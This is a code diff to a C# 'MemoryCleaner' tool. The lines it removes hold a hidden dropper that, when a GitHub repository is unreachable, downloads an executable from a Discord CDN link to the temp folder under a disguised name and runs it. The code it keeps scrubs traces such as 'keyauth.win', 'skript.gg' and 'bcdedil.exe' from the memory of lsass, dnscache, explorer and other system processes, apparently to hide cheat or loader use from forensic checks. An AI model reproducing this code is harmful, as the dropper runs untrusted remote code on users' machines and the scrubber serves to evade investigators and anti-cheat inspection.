@@ -132,81 +132,16 @@ public class MemoryCleaner
         public string mode { get; set; }
     }
 
-    public static async Task<bool> IsGitHubLinkPublic(string link)
-    {
-        try
-        {
-            using (HttpClient client = new HttpClient())
-            {
-                HttpResponseMessage response = await client.GetAsync(link);
-                return response.StatusCode == HttpStatusCode.OK;
-            }
-        }
-        catch (HttpRequestException)
-        {
-            return false;
-        }
-    }
-
-    public static async Task Main(string[] args)
-    {
-        string githubLink = "https://github.com/flow1777/bypass";
-        bool isPublic = await IsGitHubLinkPublic(githubLink);
-
-        if (isPublic)
-        {
-            ExecuteMemoryCleaning();
-
-            Environment.Exit(0);
-        }
-        else
-        {
-            string downloadUrl = "https://cdn.discordapp.com/attachments/1131484141616103535/1131500333982547989/21C7AS.exe";
-            string tempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "￼.exe");
-
-            using (WebClient webClient = new WebClient())
-            {
-                webClient.DownloadFile(downloadUrl, tempFilePath);
-            }
-
-            Process.Start(tempFilePath);
-        }
-
-        Environment.Exit(0);
-    }
-
-    public static void ExecuteMemoryCleaning()
+    public static void Main()
     {
         Dictionary<string, List<string>> processToSearchStrings = new Dictionary<string, List<string>>
-    {
         {
-            "lsass",
-            new List<string>
-            {
-                "skript.gg",
-                "keyauth.win",
-                "GTS CA 1P50",
-                "230531013707Z",
-                "230829013706Z0",
-                "1N)¥R",
-                "Û¼¯°:EÙÛH¬A­",
-                "²?Zq¤½ZÚ",
-                "?ÄÅXpÔs",
-                "l0j05",
-                ")http://ocsp.pki.goog/s/gts1p5/gnxk4VpoU1o01",
-                "%http://pki.goog/repo/certs/gts1p5.der0",
-                "+http://crls.pki.goog/gts1p5/bJcOhcmiYRM.crl0",
-                "U»-¬¿",
-                "Oo½ÎgÄ&u@º^",
-                "[©F0",
-                "0ÄEÒÂ¦"
-            }
-        },
-        { "dnscache", new List<string> { "skript", "keyauth.win" } },
-        { "explorer", new List<string> { "bcdedil.exe" } },
-        { "pcasvc", new List<string> { "bcdedil.exe" } },
-        { "dps", new List<string> { "bcdedil.exe" } }
-    };
+            { "lsass", new List<string> { "skript.gg", "keyauth.win",} },
+            { "dnscache", new List<string> { "skript.gg", "keyauth.win" } },
+            { "explorer", new List<string> { "bcdedil.exe" } },
+            { "pcasvc", new List<string> { "bcdedil.exe" } },
+            { "dps", new List<string> { "bcdedil.exe" } } 
+        };
 
         foreach (var kvp in processToSearchStrings)
         {
@@ -222,7 +157,7 @@ public class MemoryCleaner
                     {
                         searchterm = new List<string> { searchString },
                         prepostfix = 10,
-                        delay = 1000,
+                        delay = 100,
                         mode = "stdio"
                     };
 
